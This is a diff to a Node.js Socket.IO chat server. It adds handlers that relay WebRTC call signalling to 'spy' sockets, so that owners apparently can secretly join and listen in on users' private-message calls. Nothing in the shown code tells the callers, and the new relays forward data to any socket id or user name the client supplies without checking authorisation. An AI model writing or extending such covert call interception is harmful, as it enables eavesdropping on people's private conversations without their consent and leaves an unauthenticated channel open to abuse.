@@ -1094,6 +1094,40 @@ io.on('connection', (socket) => {
     // Notify owner spies watching this PM conversation
     io.to('spy||' + convKey).emit('spy-call-offer', { ...data, from: user.name, convKey });
   });
+
+  // Spy answer back to caller (so caller completes WebRTC handshake with spy)
+  socket.on('spy-answer-to-caller', (data) => {
+    const user = chatUsers[socket.id];
+    if (!user) return;
+    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
+    if (toSid) io.to(toSid).emit('spy-answer', { answer: data.answer, spyId: socket.id });
+  });
+
+  // ICE from spy to caller
+  socket.on('spy-ice-to-caller', (data) => {
+    const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
+    if (toSid) io.to(toSid).emit('spy-ice', { candidate: data.candidate });
+  });
+
+  // Caller sends fresh offer directly to spy socket
+  socket.on('spy-offer-to-spy', (data) => {
+    if (data.spyId) io.to(data.spyId).emit('spy-direct-offer', { offer: data.offer, from: socket.id });
+  });
+
+  // Caller sends ICE to spy socket
+  socket.on('call-ice-to-spy', (data) => {
+    if (data.spyId) io.to(data.spyId).emit('spy-direct-ice', { candidate: data.candidate });
+  });
+
+  // Spy sends final answer back to caller
+  socket.on('spy-answer-back', (data) => {
+    if (data.callerId) io.to(data.callerId).emit('spy-final-answer', { answer: data.answer });
+  });
+
+  // Spy sends ICE back to caller
+  socket.on('spy-ice-back', (data) => {
+    if (data.callerId) io.to(data.callerId).emit('spy-final-ice', { candidate: data.candidate });
+  });
   socket.on('call-answer', (data) => {
     const user = chatUsers[socket.id];
     const toSid = Object.keys(chatUsers).find(id => chatUsers[id].name === data.to);
